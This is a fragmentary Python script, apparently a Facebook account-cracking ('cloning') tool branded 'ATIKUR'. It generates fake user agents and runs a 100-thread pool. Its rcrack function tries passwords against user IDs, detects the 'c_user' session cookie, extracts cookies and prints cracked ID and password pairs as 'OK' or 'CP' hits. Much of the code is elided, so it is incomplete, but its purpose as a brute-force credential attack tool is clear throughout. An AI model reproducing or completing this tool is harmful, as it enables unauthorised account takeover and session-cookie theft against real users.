...
for ua in range(5000):
    ...
    ugen.append(uaku2)
os.system("espeak \"Wall come To atikur Boss World sir, Bangladesh Random Cloning Start Please Wait\"")
logo=("""
...
\33[38;5;196m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mıllıllı⭐🌟 ATIKUR 🌟⭐ıllıllı\33[38;5;196m━━━━━━━━━
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\33[38;5;196m        : [★]ATIKUR𝙄\33[38;5;196m         ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\33[38;5;196m    : [★]𝙈𝘿 ATIKUR𝙄\33[38;5;196m         ┃
...
def fuck():
    ...
    with ThreadPool(max_workers=100) as Mehedi:
        ...
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY ATIKUR JOIN MY GROUP ')
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'  \r\033[1;92m  [ATIK-OK] '+uid+' • '+ps+'\33[0;92m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[ATIK-CP💔] {uid} • {ps}")
